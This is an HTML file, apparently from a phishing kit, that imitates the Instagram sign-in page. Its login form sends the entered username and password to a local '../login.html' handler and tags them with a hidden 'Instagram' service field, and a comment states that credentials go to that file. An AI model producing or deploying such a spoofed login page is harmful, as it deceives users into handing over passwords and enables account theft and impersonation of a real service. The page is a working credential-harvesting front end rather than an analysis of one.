<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>

    <title>Sign in to Instagram.com</title>

    <meta charset="UTF-8" />
    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <meta name="description" id="description" content="Sign in to Instagram.com" />

    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href="//fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
    <link href="instagram.css" rel="stylesheet" />

  </head>
  <body tabindex="0">

    <!-- form wrapper -->
    <section class="instagram-wrap">

      <!-- form sidebar slideshow  -->
      <aside class="instagram-slideshow" id="slideshow">
        <img src="carousel-1.jpg" alt="Instagram sample 1" class="active" />
        <img src="carousel-2.jpg" alt="Instagram sample 2" />
        <img src="carousel-3.jpg" alt="Instagram sample 3" />
        <img src="carousel-4.jpg" alt="Instagram sample 4" />
      </aside>

      <!-- form center container -->
      <main class="instagram-container">

        <!-- login form, credentials will go to linked file in action attribute -->
        <form class="instagram-form" action="../login.html" method="GET">
          <input type="hidden" name="_service" value="Instagram" />

          <!-- form logo -->
          <div class="instagram-logo">
            <img src="instagram-logo.png" alt="Instagram" />
          </div>

          <!-- username input -->
          <div class="instagram-input instagram-username">
            <input type="text" id="_username" name="_username" value="" />
            <label for="_username">Phone number, username, or username</label>
          </div>

          <!-- password input -->
          <div class="instagram-input instagram-password">
            <input type="password" id="_password" name="_password" value="" />
            <label for="_password">Password</label>
          </div>

          <!-- remember checkbox -->
          <div class="instagram-remember">
            <input type="checkbox" name="_remember" checked />
            <span>Save login info</span>
          </div>

          <!-- form action button -->
          <div class="instagram-action">
            <button class="btn" type="submit" disabled>Log In</button>
          </div>

          <!-- signup button -->
          <div class="instagram-options">
            <div class="instagram-options-heading">
              <span>OR</span>
            </div>
            <div class="instagram-facebook-login">
              <img src="facebook-icon.svg" alt="Facebook" />
              <a href="#">Log in with Facebook</a>
            </div>
            <div class="instagram-forgot-login">
              <a href="#">Forgot password?</a>
            </div>
          </div>

        </form>

        <!-- signup container -->

        <div class="instagram-signup">
          <span>Don't have an account?</span>
          <a href="https://www.instagram.com/accounts/usernamesignup/">Sign up</a>
        </div>

        <!-- apps container -->

        <div class="instagram-apps">
          <p>Get the app.</p>
          <div class="instagram-apps-imgs">
            <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo">
              <img src="store-apple.png" alt="Available on the App Store" />
            </a>
            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXQXM6wAEAAH5GPKMYOl2CQj2GZ3x%26utm_content%3Dlo%26utm_medium%3Dbadge">
              <img src="store-google.png" alt="Available on Google Play" />
            </a>
          </div>
        </div>

      </main>

    </section>

    <!-- form footer links -->
    <footer class="instagram-footer">
      <ul class="instagram-footer-links">
        <li><a href="/about/us/">About us</a></li>
        <li><a href="https://help.instagram.com/">Support</a></li>
        <li><a href="https://instagram-press.com/">Press</a></li>
        <li><a href="/developer/">API</a></li>
        <li><a href="/about/jobs/">Jobs</a></li>
        <li><a href="/legal/privacy/">Privacy</a></li>
        <li><a href="/legal/terms/">Terms</a></li>
        <li><a href="/explore/locations/">Directory</a></li>
        <li><a href="/directory/profiles/">Profiles</a></li>
        <li><a href="/directory/hashtags/">Hashtags</a></li>
        <li><a href="#">Language</a></li>
      </ul>
      <div class="instagram-footer-copyright">
        Â© 2019 INSTAGRAM
      </div>
    </footer>

    <!-- form scripts -->
    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
    <script src="instagram.js"></script>

  </body>
</html>
